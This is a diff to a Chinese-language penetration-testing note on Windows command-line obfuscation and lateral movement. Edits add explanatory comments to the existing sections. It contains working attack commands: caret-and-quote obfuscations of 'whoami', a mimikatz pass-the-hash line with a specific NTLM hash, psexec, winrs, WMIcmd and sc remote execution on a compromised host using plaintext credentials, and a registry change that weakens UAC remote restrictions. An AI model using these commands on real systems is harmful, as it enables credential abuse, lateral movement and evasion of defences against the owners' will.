@@ -34,7 +34,6 @@ wh""o^a^mi #正常执行
 wh""o^am"i #正常执行
 ((((Wh^o^am""i)))) #正常执行
 w"""""""""""""hoami #正常执行
-w"""""""""""""hoa^m""i #正常执行
 w"""""""""""""hoa^^m""i #执行错误
 ```
 
@@ -160,9 +159,9 @@ FOR /F ["options"] %variable IN ('command') DO command [command-parameters]
 ```
 
 (file-set) 为文件名，for会依次将file-set中的文件打开，并且在进行到下一个文件之前将每个文件读取到内存，按照每一行分成一个一个的元素，忽略空白行。(“string”)代表字符串，(‘command’)代表命令。
-假如文件aa.txt中有如下内容：
-第1行第1列 第1行第2列
-第2行第1列 第2行第2列
+假如文件aa.txt中有如下内容：  
+第1行第1列 第1行第2列  
+第2行第1列 第2行第2列  
 
 要想读出aa.txt中的内容，可以用 `for /F %i in (aa.txt) do echo %i` ，如果去掉/F参数则只会输出aa.txt，并不会读取其中的内容。 先从括号执行，因为含有参数/F,所以for会先打开aa.txt，然后读出aa.txt里面的所有内容，把它作为一个集合，并且以每一行作为一个元素。由执行结果可见，并没有输出第二列的内容。原因是如果没有指定"delims=符号列表"这个开关，那么 `for /F` 语句会默认以空格键或Tab键作为分隔符。 `For /F` 是以行为单位来处理文本文件的，如果我们想把每一行再分解成更小的内容，就使用delims和tokens选项。delims用来告诉for每一行用什么作为分隔符，默认分隔符是空格和Tab键。  
 ```bash
@@ -202,8 +201,11 @@ show options
 run
 ```
 ### 3.mimikatz传递hash方式连接+at计划任务执行命令：
+Mimikatz 是一个用于提取系统中存储的明文密码、哈希值和票据的工具。它可以用于在 Windows 系统中执行横向移动，其中一个常见的用途就是通过在受感染系统上设置计划任务（at 计划任务）来执行命令。  
 ```bash
-mimikatz.exe privilege::debug "sekurlsa::pth /domain:. /user:administrator /ntlm:2D20D252A479F485CDF5E171D93985BF" //传递hash
+#使用 Mimikatz 的 psexec 模块将哈希值传递给目标系统，这将使用哈希值进行身份验证，并启动一个新的命令提示符（cmd.exe）进程
+# mimikatz sekurlsa::pth /user:<目标用户> /domain:<目标域> /ntlm:<目标NTLM哈希> /run:"cmd.exe"
+mimikatz.exe privilege::debug "sekurlsa::pth /user:administrator /domain:. /ntlm:2D20D252A479F485CDF5E171D93985BF" 
 dir \\192.168.1.185\c$
 ```
 ### 4.WMIcmd执行命令,有回显：
@@ -214,9 +216,13 @@ WMIcmd.exe -h 192.168.1.152 -d hostname -u pt007 -p admin123 -c "ipconfig"
 https://github.com/nccgroup/WMIcmd/releases
 ### 5.Cobalt strkie远程执行命令与hash传递攻击:
 ### 6.psexec.exe远程执行命令:
+需要下载 Sysinternals 工具包，其中包含 PsExec。你可以从 [Microsoft 官方网站](https://learn.microsoft.com/zh-cn/sysinternals/downloads/)上下载 Sysinternals Suite。将下载的 PsExec.exe 文件放置在系统的 PATH 目录中，或者在命令行中直接指定 PsExec.exe 的完整路径。
 ```bash
 psexec /accepteula //接受许可协议
 sc delete psexesvc
+# psexec \\目标计算机 -u 用户名 -p 密码 命令
+# 目标计算机: 目标计算机的名称或 IP 地址。-u 用户名: 用于身份验证的用户名。
+#-p 密码: 用户名对应的密码。命令: 要在远程系统上执行的命令。
 psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
 ```
 ### 7.psexec.vbs远程执行命令:
@@ -224,6 +230,7 @@ psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
 cscript psexec.vbs 192.168.1.158 pt007 admin123 "ipconfig"
 ```
 ### 8.winrm远程执行命令:
+Windows 远程管理服务（WinRM）是 Microsoft 提供的用于在 Windows 系统上进行远程管理的服务。WinRM 使用了标准的 Web 服务协议（HTTP 和 HTTPS）来提供远程管理。你可以使用 PowerShell 或其他工具通过 WinRM 在远程系统上执行命令。  
 ```bash
 #肉机上面快速启动winrm服务，并绑定到5985端口：
 winrm quickconfig -q
@@ -232,19 +239,28 @@ netstat -ano|find "5985"
 #客户端连接方式：
 winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 "whoami /all"
 winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 cmd
-#UAC问题,修改后，普通管理员登录后也是高权限:
+#UAC问题（用户账户控制）,修改后，普通管理员登录后也是高权限:
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 "whoami /groups"
 ```
+* 注意事项:  
+1.`UAC` 是 `Windows` 中的一种安全机制，用于防止未经授权的更改系统设置。当 `UAC` 启用时，即使用户有管理员权限，也可能需要以管理员身份运行某些命令。请确保有适当的权限来在远程系统上执行命令。 
+2.在远程系统上启用 WinRM 时，请注意系统安全性，确保仅受信任的用户或系统可以访问 WinRM。  
+3.需要注意防火墙设置，确保 WinRM 的端口（默认为 5985 或 5986）是允许通信的。  
+
 ### 9.远程命令执行sc:
-建立ipc连接(参见net use + at)后上传等待运行的bat或exe程序到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行程序）：
+在 Windows 操作系统中，sc（Service Control）命令用于与系统服务进行交互。    
+建立 `IPC` 连接(参见net use + at)后上传等待运行的bat或exe程序到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行程序）, `IPC`（Inter-Process Communication）是进程间通信的缩写，指的是在不同进程之间传递数据和信息的机制：
 ```bash
 net use \\192.168.17.138\c$ "admin123" /user:pt007
 net use
 dir \\192.168.17.138\c$
 copy test.exe \\192.168.17.138\c$
+# 使用 sc 创建一个新服务
 sc \\192.168.17.138 create test binpath= "c:\test.exe"
+# 使用 sc 启动一个服务
 sc \\192.168.17.138 start test
+# 使用 sc 删除一个服务
 sc \\192.168.17.138 del test
 ```
 
